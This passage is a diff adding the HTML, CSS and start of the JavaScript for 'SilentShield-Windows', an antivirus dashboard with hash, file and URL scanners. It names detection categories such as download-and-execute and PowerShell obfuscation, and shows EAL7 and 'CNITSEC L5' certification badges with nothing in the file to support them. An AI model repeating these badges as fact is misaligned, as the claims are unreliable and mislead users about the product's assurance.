@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>SilentShield-Windows</title>
+<style>
+:root{
+  --brand:#2ECC71;--brand-d:#27AE60;--brand-l:rgba(46,204,113,0.08);--brand-m:rgba(46,204,113,0.18);
+  --brand-bg:rgba(46,204,113,0.04);--brand-bg2:rgba(46,204,113,0.06);--brand-glow:rgba(46,204,113,0.12);--brand-shadow:rgba(46,204,113,0.15);
+  --brand-ripple:rgba(46,204,113,0.25);--brand-glow35:rgba(46,204,113,0.35);--brand-light3:rgba(46,204,113,0.03);--brand-clean:rgba(46,204,113,0.06);--brand-border3:rgba(46,204,113,0.3);
+  --w:#FFFFFF;--t:#1a1a2e;--s:#70757A;--xs:#9AA0A6;
+  --glass-bg:rgba(255,255,255,0.55);--glass-border:rgba(255,255,255,0.7);--glass-shadow:0 8px 32px rgba(0,0,0,0.06);
+  --card-bg:rgba(255,255,255,0.72);--card-hover:rgba(255,255,255,0.88);
+  --danger:#E74C3C;--warn:#F39C12;--info:#3498DB;
+}
+body.danger-mode{
+   --brand:#E74C3C;--brand-d:#C0392B;--brand-l:rgba(231,76,60,0.1);--brand-m:rgba(231,76,60,0.2);
+   --brand-bg:rgba(231,76,60,0.05);--brand-bg2:rgba(231,76,60,0.08);--brand-glow:rgba(231,76,60,0.14);--brand-shadow:rgba(231,76,60,0.18);
+   --brand-ripple:rgba(231,76,60,0.25);--brand-glow35:rgba(231,76,60,0.35);--brand-light3:rgba(231,76,60,0.03);--brand-clean:rgba(231,76,60,0.06);--brand-border3:rgba(231,76,60,0.3);
+ }
+ body.danger-mode{
+   background-image:radial-gradient(ellipse 80% 60% at 50% -10%,rgba(231,76,60,0.06),transparent),
+     radial-gradient(ellipse 40% 50% at 90% 80%,rgba(231,76,60,0.04),transparent),
+     radial-gradient(ellipse 30% 40% at 10% 20%,rgba(231,76,60,0.03),transparent);
+ }
+ body.danger-mode::before{
+   background:radial-gradient(circle at 30% 40%,rgba(231,76,60,0.03) 0%,transparent 50%),
+     radial-gradient(circle at 70% 60%,rgba(231,76,60,0.02) 0%,transparent 50%);
+ }
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'SF Pro Display','Segoe UI',system-ui,-apple-system,sans-serif;
+  background:var(--w);color:var(--t);min-height:100vh;overflow-x:hidden;
+  background-image:radial-gradient(ellipse 80% 60% at 50% -10%,var(--brand-bg2),transparent),
+    radial-gradient(ellipse 40% 50% at 90% 80%,rgba(52,152,219,0.04),transparent),
+    radial-gradient(ellipse 30% 40% at 10% 20%,var(--brand-light3),transparent);
+}
+/* ── Animated background aurora ── */
+body::before{
+  content:'';position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;
+  background:radial-gradient(circle at 30% 40%,var(--brand-light3) 0%,transparent 50%),
+    radial-gradient(circle at 70% 60%,var(--brand-light3) 0%,transparent 50%);
+  animation:aurora 12s ease-in-out infinite alternate;
+}
+@keyframes aurora{
+  0%{opacity:0.5;transform:scale(1)}
+  100%{opacity:1;transform:scale(1.08)}
+}
+
+/* ── Layout ── */
+.app{position:relative;z-index:1;max-width:880px;margin:0 auto;padding:32px 24px 48px;display:grid;
+  grid-template-columns:1fr 340px;gap:20px}
+@media(max-width:780px){.app{grid-template-columns:1fr;max-width:480px}}
+
+/* ── Glass card base ── */
+.glass{
+  background:var(--glass-bg);backdrop-filter:blur(24px) saturate(180%);
+  -webkit-backdrop-filter:blur(24px) saturate(180%);
+  border:1px solid var(--glass-border);border-radius:20px;
+  box-shadow:var(--glass-shadow);
+  transition:transform 0.35s cubic-bezier(0.25,0.8,0.25,1.2),box-shadow 0.35s ease;
+}
+.glass:hover{box-shadow:0 12px 40px rgba(0,0,0,0.08)}
+.glass-deep{background:rgba(255,255,255,0.72);backdrop-filter:blur(32px) saturate(200%);-webkit-backdrop-filter:blur(32px) saturate(200%)}
+
+/* ── Header ── */
+.header{display:flex;align-items:center;gap:14px;margin-bottom:24px;padding:0 4px}
+.header-logo{width:40px;height:40px}
+.header-logo path{fill:var(--brand)}
+.header-info h1{font-size:24px;font-weight:700;color:var(--t);letter-spacing:-0.3px;line-height:1.2}
+.header-info span{font-size:11px;color:var(--s);font-weight:500;letter-spacing:0.4px}
+.header-right{margin-left:auto;display:flex;align-items:center;gap:10px}
+.cert-badge{font-size:9px;color:var(--brand);font-weight:600;padding:4px 10px;border-radius:20px;background:var(--brand-l);letter-spacing:0.5px}
+
+/* ── Refresh Button (Liquid Glass) ── */
+.refresh-btn{
+  width:36px;height:36px;border-radius:50%;border:none;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(255,255,255,0.5);backdrop-filter:blur(16px) saturate(180%);
+  -webkit-backdrop-filter:blur(16px) saturate(180%);
+  border:1px solid rgba(255,255,255,0.7);
+  box-shadow:0 4px 16px rgba(0,0,0,0.06),inset 0 1px 0 rgba(255,255,255,0.8),inset 0 -1px 0 rgba(255,255,255,0.2);
+  color:var(--brand);font-size:0;
+  transition:all 0.35s cubic-bezier(0.25,0.8,0.25,1.2);
+  position:relative;overflow:hidden;
+}
+.refresh-btn::before{
+  content:'';position:absolute;inset:0;border-radius:50%;
+  background:linear-gradient(135deg,rgba(255,255,255,0.6) 0%,rgba(255,255,255,0) 50%);
+  pointer-events:none;
+}
+.refresh-btn:hover{
+  background:rgba(255,255,255,0.7);
+  transform:scale(1.08) translateY(-1px);
+  box-shadow:0 6px 24px rgba(0,0,0,0.08),inset 0 1px 0 rgba(255,255,255,0.9),inset 0 -1px 0 rgba(255,255,255,0.3);
+  color:var(--brand-d);
+}
+.refresh-btn:active{
+  transform:scale(0.95) translateY(0);
+  box-shadow:0 2px 8px rgba(0,0,0,0.04),inset 0 1px 3px rgba(0,0,0,0.06);
+}
+.refresh-btn.spinning svg{animation:refreshSpin 0.7s cubic-bezier(0.4,0,0.2,1)}
+@keyframes refreshSpin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.refresh-btn svg{transition:transform 0.35s ease}
+
+/* ── Shield Hero ── */
+.hero{display:flex;align-items:center;gap:20px;padding:20px 24px;margin-bottom:20px}
+.shield-svg-wrap{position:relative;flex-shrink:0}
+.shield-svg{width:90px;height:100px;filter:drop-shadow(0 4px 12px var(--brand-shadow));transition:filter 0.5s}
+.shield-svg.active{filter:drop-shadow(0 6px 20px var(--brand-glow35))}
+.shield-path{fill:var(--brand);opacity:0.12;transition:opacity 0.5s ease,fill 0.5s ease}
+.shield-path.active{opacity:1}
+.shield-check{stroke:var(--w);stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round;
+  stroke-dasharray:50;stroke-dashoffset:50;transition:stroke-dashoffset 0.7s cubic-bezier(0.25,0.8,0.25,1.2)}
+.shield-check.active{stroke-dashoffset:0}
+.shield-glow{position:absolute;inset:-10px;border-radius:50%;background:radial-gradient(circle,var(--brand-glow),transparent 70%);
+  opacity:0;transition:opacity 0.6s}
+.shield-glow.active{opacity:1;animation:glowPulse 2.5s ease-in-out infinite}
+@keyframes glowPulse{0%,100%{transform:scale(1);opacity:0.6}50%{transform:scale(1.15);opacity:1}}
+.hero-text{flex:1}
+.hero-title{font-size:15px;font-weight:600;color:var(--t);margin-bottom:2px}
+.hero-sub{font-size:11px;color:var(--s);line-height:1.5}
+.hero-points{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+.hp{font-size:9px;padding:3px 8px;border-radius:12px;background:var(--brand-l);color:var(--brand);font-weight:500}
+
+/* ── Toggle ── */
+.toggle-row{display:flex;align-items:center;justify-content:center;gap:12px;margin:4px 0 16px}
+.toggle-label{font-size:12px;font-weight:600;color:var(--s);letter-spacing:0.8px;transition:color 0.3s}
+.toggle-label.active{color:var(--brand)}
+.tgl{position:relative;width:60px;height:31px;cursor:pointer;-webkit-tap-highlight-color:transparent}
+.tgl input{display:none}
+.tgl-track{position:absolute;inset:0;border-radius:31px;background:#E8EAED;transition:background 0.4s cubic-bezier(0.25,0.8,0.25,1.2)}
+.tgl input:checked+.tgl-track{background:var(--brand)}
+.tgl-thumb{position:absolute;top:3px;left:3px;width:25px;height:25px;border-radius:50%;background:var(--w);
+  box-shadow:0 2px 8px rgba(0,0,0,0.12);transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1)}
+.tgl input:checked+.tgl-track .tgl-thumb{transform:translateX(29px)}
+.tgl-ripple{position:absolute;inset:-6px;border-radius:43px;opacity:0;transition:opacity 0.25s}
+.tgl:active .tgl-ripple{opacity:1;background:var(--brand-m)}
+
+/* ── Ripple effect ── */
+.ripple{position:relative;overflow:hidden}
+.ripple-effect{position:absolute;border-radius:50%;background:var(--brand-m);transform:scale(0);
+  animation:rippleAnim 0.7s ease-out forwards;pointer-events:none}
+@keyframes rippleAnim{to{transform:scale(4);opacity:0}}
+
+/* ── Stats row ── */
+.stats-grid{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:10px;margin-bottom:20px}
+.stat-card{padding:14px;text-align:center;position:relative;overflow:hidden}
+.stat-card::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--brand),transparent);
+  opacity:0;transition:opacity 0.4s}
+.stat-card:hover::after{opacity:0.6}
+.stat-val{font-size:22px;font-weight:700;color:var(--t);transition:color 0.3s}
+.stat-val.green{color:var(--brand)}
+.stat-lbl{font-size:9px;color:var(--xs);text-transform:uppercase;letter-spacing:0.8px;margin-top:3px}
+
+/* ── Section titles ── */
+.sec-title{font-size:11px;font-weight:600;color:var(--s);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.sec-dot{width:5px;height:5px;border-radius:50%;background:var(--brand)}
+
+/* ── Scan section ── */
+.scan-area{padding:16px;margin-bottom:16px}
+.scan-tabs{display:flex;gap:4px;margin-bottom:12px;background:rgba(0,0,0,0.03);border-radius:10px;padding:3px}
+.scan-tab{flex:1;text-align:center;font-size:11px;font-weight:500;padding:7px 0;border-radius:8px;cursor:pointer;
+  color:var(--s);transition:all 0.25s;border:none;background:transparent}
+.scan-tab.active{background:var(--w);color:var(--brand);box-shadow:0 1px 4px rgba(0,0,0,0.06);font-weight:600}
+.scan-input-row{display:flex;gap:8px}
+.scan-input{flex:1;height:38px;border:1px solid rgba(0,0,0,0.08);border-radius:12px;padding:0 14px;font-size:12px;
+  background:rgba(255,255,255,0.7);outline:none;transition:border 0.25s;font-family:inherit}
+.scan-input:focus{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-l)}
+.scan-btn{height:38px;padding:0 18px;border:none;border-radius:12px;background:var(--brand);color:var(--w);
+  font-size:12px;font-weight:600;cursor:pointer;transition:all 0.25s;white-space:nowrap}
+.scan-btn:hover{background:var(--brand-d);transform:translateY(-1px)}
+.scan-btn:active{transform:scale(0.97)}
+.scan-result{margin-top:12px;padding:14px;border-radius:14px;font-size:11px;display:none}
+.scan-result.show{display:block}
+.scan-result.clean{background:var(--brand-clean);border:1px solid var(--brand-shadow)}
+.scan-result.malicious{background:rgba(231,76,60,0.06);border:1px solid rgba(231,76,60,0.15)}
+.scan-result.suspicious{background:rgba(243,156,18,0.06);border:1px solid rgba(243,156,18,0.15)}
+.result-hash{font-family:'SF Mono','Consolas',monospace;font-size:10px;color:var(--xs);word-break:break-all}
+.result-verdict{font-size:14px;font-weight:700;margin:4px 0}
+.result-verdict.clean{color:var(--brand)}.result-verdict.malicious{color:var(--danger)}.result-verdict.suspicious{color:var(--warn)}
+.result-detail{font-size:10px;color:var(--s);line-height:1.5}
+.quick-actions{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+.qa-btn{font-size:9px;padding:4px 10px;border-radius:10px;border:1px solid rgba(0,0,0,0.06);background:var(--w);
+  color:var(--s);cursor:pointer;transition:all 0.2s}
+.qa-btn:hover{border-color:var(--brand);color:var(--brand);background:var(--brand-l)}
+.scan-loading{margin-top:10px;display:flex;align-items:center;gap:8px;font-size:11px;color:var(--s)}
+.scan-spinner{width:14px;height:14px;border:2px solid var(--brand-l);border-top-color:var(--brand);border-radius:50%;
+  animation:spin 0.7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ── Protections panel ── */
+.prots-panel{padding:16px}
+.prots-nav{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:14px;max-height:120px;overflow-y:auto}
+.pcat-btn{font-size:9px;padding:4px 8px;border-radius:8px;border:1px solid rgba(0,0,0,0.06);background:var(--w);
+  color:var(--s);cursor:pointer;white-space:nowrap;transition:all 0.2s;font-family:inherit}
+.pcat-btn:hover,.pcat-btn.active{border-color:var(--brand);color:var(--brand);background:var(--brand-l);font-weight:600}
+.prots-grid{margin-top:8px;display:grid;grid-template-columns:1fr;gap:4px;max-height:260px;overflow-y:auto}
+.prot-item{display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:10px;font-size:10px;
+  background:rgba(255,255,255,0.4);transition:all 0.2s;cursor:default}
+.prot-item:hover{background:var(--w)}
+.prot-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0;background:#E0E0E0;transition:all 0.3s}
+.prot-dot.on{background:var(--brand);box-shadow:0 0 6px var(--brand-shadow)}
+.prot-name{flex:1;color:var(--t);font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.prot-id{font-family:'SF Mono',monospace;font-size:9px;color:var(--xs);flex-shrink:0}
+.prot-badge{font-size:8px;padding:2px 6px;border-radius:6px;background:var(--brand-l);color:var(--brand);font-weight:600;flex-shrink:0}
+
+/* ── Sidebar ── */
+.sidebar{display:flex;flex-direction:column;gap:16px}
+.side-card{padding:16px;position:relative;overflow:hidden}
+.side-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--brand-border3),transparent)}
+.log-card{padding:14px}
+.log-card .sec-title{margin-bottom:6px}
+.log-area{font-family:'SF Mono','Consolas',monospace;font-size:9px;line-height:1.7;max-height:180px;overflow-y:auto;color:var(--t)}
+.log-area .ts{color:var(--xs);margin-right:4px}.log-area .ok{color:var(--brand)}.log-area .warn{color:var(--warn)}
+.log-area .err{color:var(--danger)}.log-area .info{color:var(--info)}
+.history-card{padding:14px}
+.history-list{max-height:200px;overflow-y:auto;display:flex;flex-direction:column;gap:6px}
+.hist-item{padding:8px 10px;border-radius:8px;font-size:9px;background:rgba(255,255,255,0.5);
+  border:1px solid rgba(0,0,0,0.04);display:flex;justify-content:space-between;align-items:center}
+.hist-item.clean{border-left:3px solid var(--brand)}.hist-item.malicious{border-left:3px solid var(--danger)}.hist-item.suspicious{border-left:3px solid var(--warn)}
+
+/* ── Liquid Glass deformation on hover ── */
+.glass-liquid{transition:all 0.5s cubic-bezier(0.25,0.8,0.25,1.2)}
+.glass-liquid:hover{transform:scale(1.01) translateY(-2px);box-shadow:0 16px 48px rgba(0,0,0,0.08)}
+
+/* ── Cursor glow ── */
+.cursor-glow{position:fixed;pointer-events:none;z-index:9999;width:200px;height:200px;
+  background:radial-gradient(circle,var(--brand-bg),transparent 70%);border-radius:50%;
+  transform:translate(-50%,-50%);transition:opacity 0.3s;opacity:0}
+
+/* ── Footer ── */
+.footer{text-align:center;padding:20px;font-size:10px;color:var(--xs);margin-top:8px}
+.footer span{color:var(--brand);font-weight:600}
+
+/* ── Toast ── */
+.toast{position:fixed;bottom:40px;left:50%;transform:translateX(-50%) translateY(100px);
+  background:rgba(26,26,46,0.92);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+  color:#fff;padding:10px 24px;border-radius:24px;font-size:12px;font-weight:500;
+  opacity:0;transition:all 0.4s cubic-bezier(0.34,1.56,0.64,1);z-index:999;border:1px solid rgba(255,255,255,0.15)}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast.success{border-color:var(--brand-m)}.toast.error{border-color:rgba(231,76,60,0.4)}
+
+/* ── Alert Modal ── */
+.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.55);backdrop-filter:blur(6px);z-index:9999;display:flex;align-items:center;justify-content:center;animation:fadeIn 0.3s ease}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.alert-modal{width:420px;padding:32px 28px;text-align:center;animation:modalIn 0.4s cubic-bezier(0.34,1.56,0.64,1)}
+@keyframes modalIn{from{transform:scale(0.85) translateY(20px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
+.alert-icon{font-size:48px;margin-bottom:12px}
+.alert-title{font-size:18px;font-weight:700;color:var(--danger);margin-bottom:8px}
+.alert-body{font-size:12px;color:var(--s);line-height:1.6;margin-bottom:12px}
+.alert-countdown{font-size:14px;font-weight:700;color:var(--warn);margin-bottom:16px;font-family:'SF Mono',monospace}
+.alert-actions{display:flex;gap:10px;justify-content:center}
+.alert-actions .scan-btn{flex:1;padding:0 14px}
+.alert-dot{animation:alertPulse 0.8s ease-in-out infinite}
+@keyframes alertPulse{0%,100%{opacity:1}50%{opacity:0.3}}
+</style>
+</head>
+<body>
+<div class="cursor-glow" id="cursorGlow"></div>
+
+<div class="app">
+  <!-- ── Main column ── -->
+  <div style="display:flex;flex-direction:column;gap:16px">
+    <!-- Header -->
+    <div class="header">
+      <svg class="header-logo" viewBox="0 0 40 40"><path d="M20 4 L34 12 L36 24 L32 36 L20 44 L8 36 L4 24 L6 12 Z"/></svg>
+      <div class="header-info"><h1>SilentShield-Windows</h1><span>力保个人电脑安全，我们正在做。</span></div>
+      <div class="header-right">
+        <span class="cert-badge">CNITSEC L5</span>
+        <span class="cert-badge">EAL7</span>
+        <button id="refreshBtn" class="refresh-btn" title="Refresh" aria-label="Refresh">
+          <svg viewBox="0 0 24 24" width="18" height="18">
+            <path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" fill="currentColor"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- Hero Shield + Toggle -->
+    <div class="glass ripple">
+      <div class="hero">
+        <div class="shield-svg-wrap">
+          <div class="shield-glow" id="shieldGlow"></div>
+          <svg class="shield-svg" id="shieldSvg" viewBox="0 0 90 100">
+            <path class="shield-path" id="shieldPath" d="M45 8 L78 28 L82 54 L72 82 L45 96 L18 82 L8 54 L12 28 Z"/>
+            <polyline class="shield-check" id="shieldCheck" points="28,52 40,64 62,38"/>
+          </svg>
+        </div>
+        <div class="hero-text">
+          <div class="hero-title" id="heroTitle">1000 Defense Methods</div>
+          <div class="hero-sub" id="heroSub">Protection engine standing by. Activate to secure your system.</div>
+          <div class="hero-points">
+            <span class="hp">SM4/SM9/SM3</span><span class="hp">AES-256-GCM</span>
+            <span class="hp">SMM Simulation</span><span class="hp">DIQ Enabled</span>
+          </div>
+        </div>
+      </div>
+      <div class="toggle-row">
+        <span class="toggle-label" id="toggleLabel">DISABLED</span>
+        <label class="tgl" id="tglWrap"><input type="checkbox" id="toggleSwitch"><span class="tgl-track"><span class="tgl-thumb"></span></span><span class="tgl-ripple"></span></label>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-grid">
+      <div class="glass stat-card"><div class="stat-val" id="statProtections">0</div><div class="stat-lbl">Protections</div></div>
+      <div class="glass stat-card"><div class="stat-val" id="statMemory">0 MB</div><div class="stat-lbl">Memory</div></div>
+      <div class="glass stat-card"><div class="stat-val" id="statCpu">0%</div><div class="stat-lbl">CPU</div></div>
+      <div class="glass stat-card"><div class="stat-val" id="statDiq">0</div><div class="stat-lbl">DIQ Queue</div></div>
+    </div>
+
+    <!-- Threat Scanner -->
+    <div class="glass glass-liquid ripple" style="padding:16px">
+      <div class="sec-title"><div class="sec-dot"></div>Threat Scanner</div>
+      <div class="scan-tabs">
+        <button class="scan-tab active" data-tab="hash">Hash Lookup</button>
+        <button class="scan-tab" data-tab="file">File Upload</button>
+        <button class="scan-tab" data-tab="url">URL Scan</button>
+      </div>
+
+      <!-- Hash tab -->
+      <div id="tab-hash">
+        <div class="scan-input-row">
+          <input class="scan-input" id="hashInput" placeholder="MD5 / SHA1 / SHA256 hash...">
+          <button class="scan-btn ripple" id="hashScanBtn">Scan</button>
+        </div>
+        <div class="quick-actions">
+          <button class="qa-btn" onclick="scanEicar()">Test EICAR</button>
+          <button class="qa-btn" onclick="scanWannaCry()">Test WannaCry</button>
+          <button class="qa-btn" onclick="document.getElementById('hashInput').value='';document.getElementById('hashInput').focus()">Clear</button>
+        </div>
+      </div>
+
+      <!-- File tab -->
+      <div id="tab-file" style="display:none">
+        <div class="scan-input-row">
+          <input class="scan-input" type="file" id="fileInput" style="padding:6px 10px;line-height:24px">
+          <button class="scan-btn ripple" id="fileScanBtn">Analyze</button>
+        </div>
+      </div>
+
+      <!-- URL tab -->
+      <div id="tab-url" style="display:none">
+        <div class="scan-input-row">
+          <input class="scan-input" id="urlInput" placeholder="https://example.com/malware...">
+          <button class="scan-btn ripple" id="urlScanBtn">Check</button>
+        </div>
+      </div>
+
+      <div class="scan-loading" id="scanLoading" style="display:none"><div class="scan-spinner"></div>Scanning...</div>
+      <div class="scan-result" id="scanResult"></div>
+    </div>
+
+    <!-- Protection Categories -->
+    <div class="glass glass-liquid ripple" style="padding:16px">
+      <div class="sec-title"><div class="sec-dot"></div>Protection Categories (100 classes · 1000 methods)</div>
+      <div class="prots-nav" id="protsNav"></div>
+      <div class="prots-grid" id="protsGrid"><div style="font-size:10px;color:var(--xs);text-align:center;padding:14px">Select a category above</div></div>
+    </div>
+
+    <!-- Advanced Threat Rules (7 new categories · 105 methods) -->
+    <div class="glass glass-liquid ripple" style="padding:16px">
+      <div class="sec-title"><div class="sec-dot"></div>Advanced Detection Rules (7 categories · 105 methods)</div>
+      <div class="prots-nav" id="advRulesNav"></div>
+      <div class="prots-grid" id="advRulesGrid"><div style="font-size:10px;color:var(--xs);text-align:center;padding:14px">Select a category above</div></div>
+    </div>
+
+    <!-- Full Disk Scanner + Process Monitor -->
+    <div class="glass glass-liquid ripple" style="padding:16px">
+      <div class="sec-title"><div class="sec-dot"></div>Full Disk Scan · All Drives · Hidden Files</div>
+      <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap">
+        <button class="scan-btn ripple" id="quickScanBtn" style="flex:1;min-width:100px">⚡ Quick Scan</button>
+        <button class="scan-btn ripple" id="fullScanBtn" style="flex:1;min-width:100px;background:var(--brand-d)">🔍 All Drives</button>
+        <button class="scan-btn ripple" id="procScanBtn" style="flex:1;min-width:100px;background:var(--info)">📋 Processes</button>
+        <button class="scan-btn ripple" id="malbBtn" style="flex:1;min-width:100px;background:#E67E22">🦠 MalBazaar</button>
+      </div>
+      <div class="scan-loading" id="advScanLoading" style="display:none"><div class="scan-spinner"></div><span id="advScanStatus">Scanning...</span></div>
+      <div class="scan-result" id="advScanResult"></div>
+      <div style="font-size:9px;color:var(--xs);margin-top:6px">Quick Scan: user directories 1000-file limit · Full Scan: recursive all directories</div>
+    </div>
+
+    <!-- Dynamic Sandbox + AI Analysis -->
+    <div class="glass glass-liquid ripple" style="padding:16px">
+      <div class="sec-title"><div class="sec-dot"></div>Dynamic Sandbox & AI Analysis</div>
+      <div class="scan-input-row">
+        <input class="scan-input" id="sbInput" placeholder="Enter code snippet / script / binary description...">
+        <button class="scan-btn ripple" id="sbAnalyzeBtn" style="background:#8E44AD">Analyze</button>
+      </div>
+      <div class="quick-actions">
+        <button class="qa-btn" onclick="testSandboxMalware()">Test Malicious Script</button>
+        <button class="qa-btn" onclick="testSandboxClean()">Test Clean Code</button>
+      </div>
+      <div class="scan-loading" id="sbLoading" style="display:none"><div class="scan-spinner"></div>Sandbox analyzing...</div>
+      <div class="scan-result" id="sbResult"></div>
+      <div style="font-size:9px;color:var(--xs);margin-top:6px">Detects: VBA macros · PowerShell obfuscation · WMI persistence · Download+Execute · Base64 decoding · PE packing</div>
+    </div>
+
+    <!-- Security Score + Quarantine -->
+    <div class="glass glass-liquid ripple" style="padding:16px">
+      <div class="sec-title"><div class="sec-dot"></div>Security Score · Quarantine · Log</div>
+      <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap">
+        <button class="scan-btn ripple" id="scoreBtn" style="flex:1;min-width:80px">Score</button>
+        <button class="scan-btn ripple" id="quarantineBtn" style="flex:1;min-width:80px;background:var(--warn)">Quarantine</button>
+        <button class="scan-btn ripple" id="rollbackBtn" style="flex:1;min-width:80px;background:var(--info)">Rollback</button>
+        <button class="scan-btn ripple" id="reportBtn" style="flex:1;min-width:80px;background:#6C5CE7">Report</button>
+        <button class="scan-btn ripple" id="aiBtn" style="flex:1;min-width:80px;background:#8E44AD">AI</button>
+      </div>
+      <div style="display:flex;align-items:center;justify-content:center;gap:12px;padding:10px 0" id="scoreDisplay">
+        <div style="font-size:36px;font-weight:800;color:var(--brand)" id="scoreValue">—</div>
+        <div><div style="font-size:12px;font-weight:600" id="scoreGrade">Calculate</div><div style="font-size:9px;color:var(--xs)" id="scoreText">security score</div></div>
+      </div>
+      <div class="scan-result" id="advActionResult"></div>
+    </div>
+
+    <div class="footer"><span>CNITSEC Level 5</span> / EAL7 &nbsp;·&nbsp; <span>SM4/SM9/SM3</span> &nbsp;·&nbsp; Threat DB: <span id="sigsCount">20</span> local signatures &nbsp;·&nbsp; VirusTotal API</div>
+  </div>
+
+  <!-- ── Sidebar ── -->
+  <div class="sidebar">
+    <!-- Activity Log -->
+    <div class="glass side-card log-card">
+      <div class="sec-title"><div class="sec-dot"></div>Activity Log</div>
+      <div class="log-area" id="logArea">
+        <div><span class="ts">--:--:--</span> <span class="info">SilentShield ready</span></div>
+      </div>
+    </div>
+
+    <!-- Scan History -->
+    <div class="glass side-card history-card">
+      <div class="sec-title"><div class="sec-dot"></div>Scan History</div>
+      <div class="history-list" id="historyList">
+        <div style="font-size:9px;color:var(--xs);padding:8px;text-align:center">No scans yet</div>
+      </div>
+    </div>
+
+    <!-- Quick Info -->
+    <div class="glass side-card" style="padding:14px;font-size:10px;color:var(--s);line-height:1.8">
+      <div class="sec-title"><div class="sec-dot"></div>System Info</div>
+      <div>Engine: <b id="infoEngine">standby</b></div>
+      <div>Hash: <b id="infoHash">—</b></div>
+      <div>Low-Level: <b id="infoLow">—</b></div>
+      <div>IPC: <b id="infoIpc">—</b></div>
+      <div>DIQ: <b id="infoDiq">—</b></div>
+      <div>Threat DB: <b id="infoThreat">20 sigs</b></div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<!-- Threat Alert Modal -->
+<div class="alert-overlay" id="alertOverlay" style="display:none">
+  <div class="alert-modal glass-deep">
+    <div class="alert-icon" id="alertIcon">⚠</div>
+    <div class="alert-title" id="alertTitle">Threat Detected</div>
+    <div class="alert-body" id="alertBody">A security threat has been detected.</div>
+    <div class="alert-countdown" id="alertCountdown">Auto-delete in 30s</div>
+    <div class="alert-actions">
+      <button class="scan-btn" id="alertDeleteBtn" style="background:var(--danger)">🗑 Delete Now</button>
+      <button class="scan-btn" id="alertIgnoreBtn" style="background:var(--s)">Ignore</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const API='http://127.0.0.1:12701';
+let protectionsData=[],activeCategories={},toggling=false;
+function ts(){return new Date().toLocaleTimeString('en-GB')}
+function log(msg,cls='info'){const el=document.getElementById('logArea');el.innerHTML+=`<div><span class="ts">[${ts()}]</span> <span class="${cls}">${msg}</span></div>`;el.scrollTop=el.scrollHeight}
+function toast(msg,type='success'){const t=document.getElementById('toast');t.textContent=msg;t.className='toast '+type+' show';setTimeout(()=>t.classList.remove('show'),2200)}
+function setDangerMode(on){
+  document.body.classList.toggle('danger-mode',on);
+  if(on){log('⚠ THREAT DETECTED — System in danger mode','err');toast('⚠ Threat detected! UI switched to red alert','error')}
+  else document.getElementById('statProtections').classList.remove('danger');
+}
+async function api(path,opts){try{const r=await fetch(API+path,opts||{});return r.ok?await r.json():null}catch(e){return null}}
+async function apiPost(path,body){return api(path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)})}
+
+// ── Ripple ──
+document.addEventListener('click',e=>{const b=e.target.closest('.ripple');if(!b)return;const r=document.createElement('span');r.className='ripple-effect';const rect=b.getBoundingClientRect();const size=Math.max(rect.width,rect.height);r.style.width=r.style.height=size+'px';r.style.left=(e.clientX-rect.left-size/2)+'px';r.style.top=(e.clientY-rect.top-size/2)+'px';b.appendChild(r);setTimeout(()=>r.remove(),700)});
+
+// ── Cursor glow ──
+const cg=document.getElementById('cursorGlow');
+document.addEventListener('mousemove',e=>{cg.style.left=e.clientX+'px';cg.style.top=e.clientY+'px';cg.style.opacity='1'});
+document.addEventListener('mouseleave',()=>cg.style.opacity='0');
+
+// ── Scan tabs ──
+document.querySelectorAll('.scan-tab').forEach(t=>{t.addEventListener('click',()=>{
+  document.querySelectorAll('.scan-tab').forEach(b=>b.classList.remove('active'));
+  t.classList.add('active');
+  document.getElementById('tab-hash').style.display=t.dataset.tab==='hash'?'block':'none';
+  document.getElementById('tab-file').style.display=t.dataset.tab==='file'?'block':'none';
+  document.getElementById('tab-url').style.display=t.dataset.tab==='url'?'block':'none';
+  document.getElementById('scanResult').classList.remove('show');
+})});
+
+// ── Scan functions ──
+function showResult(r){
+  const el=document.getElementById('scanResult');el.classList.add('show');
+  el.className='scan-result show '+(r.verdict||'clean');
+  const isMalicious=r.verdict==='malicious';
+  setDangerMode(isMalicious);
+  let html='';
